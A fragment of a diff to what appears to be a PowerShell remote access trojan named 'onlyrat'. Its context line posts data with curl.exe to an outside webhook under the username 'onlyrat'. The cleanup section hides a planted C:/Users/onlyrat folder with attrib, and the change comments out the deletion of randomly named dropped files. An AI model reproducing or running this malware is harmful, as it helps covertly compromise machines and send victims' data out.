@@ -57,6 +57,6 @@ curl.exe -F "payload_json={\`"username\`": \`"onlyrat\`", \`"content\`": \`"down
 
 # cleanup
 attrib +h +s +r C:/Users/onlyrat 
-Remove-Item $CRYnrkaDbe
-Remove-Item lawFvVTikZ.txt
-Remove-Item KFPGaEYdcz.ps1
+# Remove-Item $CRYnrkaDbe
+# Remove-Item lawFvVTikZ.txt
+# Remove-Item KFPGaEYdcz.ps1
